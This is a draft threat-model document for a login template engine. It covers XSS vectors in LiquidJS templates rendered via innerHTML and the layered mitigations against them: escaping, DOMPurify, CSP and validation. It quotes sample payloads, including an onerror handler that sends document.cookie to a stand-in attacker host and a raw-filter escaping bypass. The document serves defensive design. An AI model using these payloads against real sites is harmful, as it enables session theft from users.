# Flow Engine — Template Security Model

> **Status:** Draft
> **See also:** [Flow Engine Guide](flow-engine-guide.md) · [Step Response Shape](flow-engine-nodes.md)

Rendering user-controlled or admin-controlled LiquidJS templates via `innerHTML` introduces a critical attack surface. This document covers the known vectors and the defense-in-depth mitigations.

## Attack Vectors

### 1. Payload Injection (backend → template)

An attacker attempts to manipulate a capability value (field name, text_key, or pre-filled value) to contain malicious HTML:

```json
{ "name": "email", "text_key": "<img src=x onerror=alert(1)>", "type": "email" }
```

**Mitigation:** LiquidJS **auto-escapes all `{{ }}` output by default** (since v10). The above renders as the harmless string `&lt;img src=x onerror=alert(1)&gt;`. No script execution occurs. This protection is active as long as the template uses standard `{{ }}` output tags.

### 2. `innerHTML` and inline event handlers

The orchestrator injects rendered HTML via `shadowRoot.innerHTML = html`. Browsers natively block `<script>` tags inserted this way. **However, inline event handlers execute:**

```html
<!-- This WILL execute when injected via innerHTML -->
<img src="x" onerror="fetch('https://evil.com?cookie='+document.cookie)">
```

**Mitigation:** Content Security Policy (see defense-in-depth below).

### 3. Ejected custom templates (tenant admin)

A malicious or compromised org admin "ejects" the master template and injects a persistent XSS payload:

```liquid
<!-- Malicious ejected template -->
<div class="login-card">
  <img src="x" onerror="steal(document.cookie)">
  {% for field in fields %}
    <zl-field name="{{ field[0] }}"></zl-field>
  {% endfor %}
</div>
```

**Trust boundary:** The admin who ejects the template already has full control over branding, SSO provider configuration, and user schemas. Injecting XSS into their own org's login page is self-harm. In single-tenant or self-hosted deployments, this is acceptable. In multi-tenant SaaS, this requires isolation guarantees (see mitigations).

### 4. Translation dictionary injection

A tenant provides custom translations containing HTML:

```json
{ "identifier.title": "<img src=x onerror='alert(1)'>" }
```

**Mitigation:** The `| t` filter returns a plain string. Because it is used inside `{{ }}`, LiquidJS auto-escapes the output. Safe by default.

### 5. The `| raw` filter bypass

LiquidJS provides a `| raw` filter that disables auto-escaping:

```liquid
<!-- This bypasses all auto-escaping -->
{{ malicious_value | raw }}
```

**Mitigation:** The `| raw` filter is **neutered inside the engine**: the orchestrator re-registers `raw` as a passthrough that still escapes (`packages/components/src/orchestrator/liquid.ts`), so even a stored template that uses it cannot bypass escaping when rendered by the official component. On top of that, `raw` usage is **rejected at authoring time** by the authoritative validator (Layer 4a) and lexically at save time (Layer 4b).

## Defense-in-Depth Strategy

```
┌─────────────────────────────────────────────────────┐
│  Layer 1: LiquidJS Auto-Escaping                    │
│  All {{ }} output is HTML-escaped by default.       │
│  Neutralizes payload injection from backend values. │
├─────────────────────────────────────────────────────┤
│  Layer 2: DOMPurify Sanitization                    │
│  Before innerHTML assignment, the rendered HTML     │
│  string is passed through DOMPurify to strip        │
│  dangerous tags and attributes (onerror, onclick).  │
├─────────────────────────────────────────────────────┤
│  Layer 3: Content Security Policy (CSP)             │
│  The Hosted Login page sets:                        │
│    script-src 'self';                               │
│    style-src 'self' 'unsafe-inline';                │
│  This makes ALL inline event handlers inert,        │
│  even if they survive sanitization.                 │
├─────────────────────────────────────────────────────┤
│  Layer 4a: Authoring-Time Validation (CLI)          │
│  `zitadel plan`/`apply` run the authoritative       │
│  validator from @zitadel/config: a real LiquidJS    │
│  parse (same dialect as the renderer) that rejects: │
│    - Any use of the | raw filter                    │
│    - <script> / <style> tags                        │
│    - Inline event attributes (on*)                  │
│    - Missing {% mandatory_gates %}                  │
├─────────────────────────────────────────────────────┤
│  Layer 4b: Lexical Gate on Save (server)            │
│  POST /branding rejects oversized or non-UTF-8      │
│  payloads and the same banned patterns as a         │
│  substring/regex check. Deliberately lexical: the   │
│  server is Go and LiquidJS is the dialect — a Go    │
│  AST parse would validate the wrong language.       │
├─────────────────────────────────────────────────────┤
│  Layer 5: Shadow DOM Style Isolation                │
│  The <zitadel-login> Shadow DOM prevents            │
│  customer-page CSS from interfering with the login  │
│  UI. Note: Shadow DOM does NOT provide script       │
│  isolation — CSP handles that.                      │
└─────────────────────────────────────────────────────┘
```

## Summary

| Vector | Primary Mitigation | Fallback |
|---|---|---|
| Backend payload values | LiquidJS auto-escaping | DOMPurify |
| `innerHTML` inline handlers | CSP `script-src 'self'` | DOMPurify strips `on*` attributes |
| Ejected template XSS | CLI validation at plan time (Layer 4a) | Server lexical gate + CSP + DOMPurify |
| Translation dictionary HTML | LiquidJS auto-escaping (via `{{ }}`) | DOMPurify |
| `| raw` filter abuse | Engine neuters `raw` at render | Rejected by Layers 4a/4b |
| `font_url` document-level CSS injection | Field is read-only in v1: `POST /branding` rejects it (the font stylesheet must load at document level, outside every layer above) | Safe delivery design tracked in ADR 040 |
| Template publishing with a leaked browser-plane token, or into a foreign project | The Branding management API requires a project-bound operator-grade token (`project.write` \| `branding.write`); the preview secret has no management access, and foreign projects answer like nonexistent ones | ADR 036 credential planes (mintable `branding.*` scopes) |

**The strongest single mitigation is CSP.** A strict `script-src 'self'` header on the Hosted Login page makes all inline script vectors completely inert regardless of whether the HTML was sanitized. Combined with LiquidJS auto-escaping and DOMPurify, this creates three independent layers that an attacker must defeat simultaneously.

**Consumer caveat:** the Branding API returns raw template strings. The
guarantees above hold for rendering through `@zitadel/components`; a
consumer that renders templates with its own engine owns its own
escaping, sanitisation, and CSP. See
[ADR 040](../../adrs/040-tenant-login-templates-editable-config.md) for
the storage/validation split.
